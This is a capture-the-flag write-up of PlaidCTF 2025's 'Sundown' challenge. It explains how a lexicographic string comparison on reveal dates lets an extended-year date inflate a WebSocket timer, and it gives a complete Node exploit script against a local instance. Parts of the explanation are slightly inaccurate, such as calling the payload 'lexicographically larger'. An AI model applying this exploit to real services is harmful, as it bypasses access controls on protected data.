
This is a writeup for the **Sundown** challenge from @plaidCTF’s 2025.

For this challenge, we were given a handout zip file containing the source code for the challenge itself. We can see the code in the folder.

To start the challenge, we spin it up with:
`docker compose up --build`
Now we can see a front end where we have the ability to log in.

![[Pasted image 20250407210953.png]]

If we try to log in, we’re met with an error, forcing us to register before logging in.

![[Pasted image 20250407211345.png]]

As we are now logged in, we have the ability to create secrets as well as see the secrets we’ve created.

![[Pasted image 20250407211648.png]]

We observe that the URL is:
`*/secret/93eee917-2007-4bad-adad-8c12f3f324fb`

So we know that our secret is represented by a UUID, which means it would be good to check if the database already has any secrets stored.

Open the DB:
`docker exec -it problem-db-1 psql -U postgres -d sundown`

Make it public:
`SET search_path TO sundown,public;`

Check the tables:
```
sundown=# \dt
          List of relations
 Schema  |  Name  | Type  |  Owner   
---------+--------+-------+----------
 sundown | secret | table | postgres
 sundown | token  | table | postgres
 sundown | user   | table | postgres
```

Looking inside the `secret` table:
```
id                  | owner_id | name |     secret      |       reveal_at        |          created_at          
13371337-1337-1337-1337-133713371337 | plaid    | Flag | PCTF{test_flag} | 2026-04-10 21:00:00+00 | 2025-04-07 15:34:52.874292+00

```


Here we can see that `13371337-1337-1337-1337-133713371337` is the entry where the flag is. We will ignore the flag for now, but we can also see that the reveal time is 1 year in the future.

Now, if we go to the UUID `13371337-1337-1337-1337-133713371337`, we are met with the problem: the flag only reveals in 1 year.
`*/secret/13371337-1337-1337-1337-133713371337`

![[Pasted image 20250407212237.png]]

Luckily for us, we have the source code:

```
/problem/app/src
	api.ts
	db.ts
	env.ts
	index.ts
	zodInterceptor.ts
```

With a quick scan through these files, we can tell that `api.ts` is the one we're interested in, as it has the ability to call `revealSecret()` once the remaining time gets low enough:

```JS
if (remaining <= 0) {

	revealSecret();
} else {
	if (timeoutDuration === undefined) {
		updateTimeoutDuration();
	}
	updateTimeout();
}
```
A few key observations are clear right away:

As we get a WebSocket connection, these values will be stored as long as the connection is maintained.
```JS
apiRouter.ws("/ws", (ws, req) => {
	let secretId: string | undefined;
	let secret: string | undefined;
	let timeout: NodeJS.Timeout | undefined;
	let remaining: number | undefined;
	let timeoutDuration: number | undefined;
```


The `timeoutDuration` is based on the remaining time and is fitted into these intervals. The `updateTimeout` function only gets called whenever this `timeoutDuration` is over, due to `setTimeout()`:

```JS
const UpdateIntervals = [
	Duration.fromObject({ years: 2 }).toMillis(),
	Duration.fromObject({ years: 1 }).toMillis(),
	Duration.fromObject({ months: 6 }).toMillis(),
	Duration.fromObject({ months: 2 }).toMillis(),
	Duration.fromObject({ months: 1 }).toMillis(),
	Duration.fromObject({ weeks: 1 }).toMillis(),
	Duration.fromObject({ days: 1 }).toMillis(),
	Duration.fromObject({ hours: 1 }).toMillis(),
	Duration.fromObject({ minutes: 30 }).toMillis(),
	Duration.fromObject({ minutes: 10 }).toMillis(),
	Duration.fromObject({ minutes: 5 }).toMillis(),
	Duration.fromObject({ minutes: 1 }).toMillis(),
	Duration.fromObject({ seconds: 30 }).toMillis(),
	Duration.fromObject({ seconds: 10 }).toMillis(),
	Duration.fromObject({ seconds: 5 }).toMillis(),
	Duration.fromObject({ seconds: 1 }).toMillis(),
	Duration.fromObject({ milliseconds: 500 }).toMillis(),
	Duration.fromObject({ milliseconds: 100 }).toMillis(),
];

function updateTimeoutDuration() {
	timeoutDuration = UpdateIntervals.find((interval) => interval <= remaining! / 100) ?? 100;
}

function updateTimeout() {
	if (remaining === undefined) {
		return;
	}

	if (timeout !== undefined) {
		clearTimeout(timeout);
	}

	ws.send(JSON.stringify({ kind: "Update", remaining: formatDuration(remaining) }));
  
	timeout = setTimeout(() => {
		remaining! -= timeoutDuration!;
		if (remaining! <= 0) {
			revealSecret();
		} else {
			updateTimeoutDuration();
			updateTimeout();
		}
	}, timeoutDuration);
}
```

We need to have a really large `timeoutDuration`, since that’s what determines when the secret gets revealed.

The problem is: we don’t control the `timeoutDuration` of the `1337` secret so how could we possibly change it?

If you remember from above, as long as the WebSocket connection is open, the `timeoutDuration` will be set. So the real question becomes: what is the **largest** value we can set it to?

The code tells us:

```JS
const MaxSecretDate = "2030-01-01T00:00:00.000"; // 1

apiRouter.post("/secrets/create", async (req, res) => {

const body = z
	.object({
	secret: z.string().min(1).max(1000),
	name: z.string().min(1).max(100),
	revealAt: z.string().transform((s, ctx) => { // 2

	const date = DateTime.fromISO(s);
	
	if (!date.isValid) {
		ctx.addIssue({ code: "custom", message: "Invalid date" });
		return z.NEVER;
	}
	
	if (s > MaxSecretDate) { // 3
		ctx.addIssue({
			code: "custom",
			message: "Reveal date too far in the future",
		});
		return z.NEVER;
	}
	return date;
}),

...
```


Now, here’s where it gets interesting!

If you look at the above, you can see that comments **1**, **2**, and **3** (these are not in the source code but are for demonstrative purposes) highlight how we are comparing two strings (1, 2) via a **lexicographical comparison** (3).

First, let’s learn a bit about Lexical String Comparison — at least what’s relevant here:

**JavaScript Rules for Lexical String Comparison:**

When you compare strings in JavaScript using `<`, `>`, `<=`, `>=`:

1. JavaScript does not parse the string as a number, even if it _looks_ like a number (e.g., `"100"` or `"+5"`).
    
2. It compares strings character by character from left to right using their **Unicode code points** (i.e., `.charCodeAt()`).
    
3. The first position where the characters differ determines the result.
    
4. If all characters match up to the length of the shorter string, then the shorter string is considered less than the longer one.

Example 

```JS
'+100' < '1' // true
```

This is true because `'+'` (Unicode 43) is less than `'1'` (Unicode 49) — **Rule 3** applies here.

```JS
'a100' < '1' // false
```

`'a'` (Unicode 97) is greater than `'1'` (Unicode 49) — again Rule 3.

```JS
'100000' < 'z' // true
```

`'1'` (Unicode 49) is less than `'z'` (Unicode 122) — Rule 3 again.


Now, I bet you see what we’re going to do:

```JS
import WebSocket from "ws";

const FLAG_SECRET_ID = "13371337-1337-1337-1337-133713371337";  

const username = "diet";
const password = "coke";

// Register the user
await fetch(`http://localhost:3000/api/register`, {
	method: "POST",
	headers: { "Content-Type": "application/json" },
	body: JSON.stringify({ username, password }),
});

console.log("user", username, "password", password);

// Log in the user
const loginResponse = await fetch(`http://localhost:3000/api/login`, {
	method: "POST",
	headers: { "Content-Type": "application/json" },
	body: JSON.stringify({ username, password }),
});

if (!loginResponse.ok) {
	console.error("Login failed:", loginResponse.status, await loginResponse.text());
	process.exit(1);
}

const setCookie = loginResponse.headers.get("set-cookie");
if (!setCookie) {
	console.error("No set-cookie header in login response");
	process.exit(1);
}

const cookie = setCookie.match(/session=([^;]+)/)[0];

console.log("user", username, "cookie", cookie);

// Create a secret with a lexicographically larger reveal date
const createResponse = await fetch(`http://localhost:3000/api/secrets/create`, {
	method: "POST",
	headers: { "Cookie": cookie, "Content-Type": "application/json" },
	body: JSON.stringify({
		name: "diet",
		secret: "coke",
		revealAt: "+100000-01-01T00:00:00.000Z",
	}),
});

const secretId = (await createResponse.json()).id;

console.log("Created secret", secretId);

// Open a WebSocket connection
const ws = new WebSocket("wss://localhost:3000/api/ws");

ws.addEventListener("open", () => {
	ws.addEventListener("message", (event) => {
		console.log(event.data);
	});
	ws.send(JSON.stringify({ command: "open", id: secretId }));
	ws.send(JSON.stringify({ command: "open", id: FLAG_SECRET_ID }));
});

```

Key parts 

The **initial payload** has the `revealAt` set to `"+100000-01-01T00:00:00.000Z"`, which is lexicographically larger than the current reveal date.

```JS
ws.addEventListener("open", () => {
	ws.addEventListener("message", (event) => {
		console.log(event.data);
	});
	ws.send(JSON.stringify({ command: "open", id: secretId }));
	ws.send(JSON.stringify({ command: "open", id: FLAG_SECRET_ID }));
});
```

```JSON
{"kind":"Reveal","id":"13371337-1337-1337-1337-133713371337","secret":"PCTF{welcome_to_plaidctf_2026!!1one_69df568bcf58e1ff}"}
```
### Conclusion

This challenge was a great example of how a subtle misuse of string comparison can lead to a critical logic flaw. By injecting a secret with a lexicographically larger (but syntactically invalid) date, we manipulated the server’s timeout duration and prematurely revealed a flag that was intended to stay hidden for a year.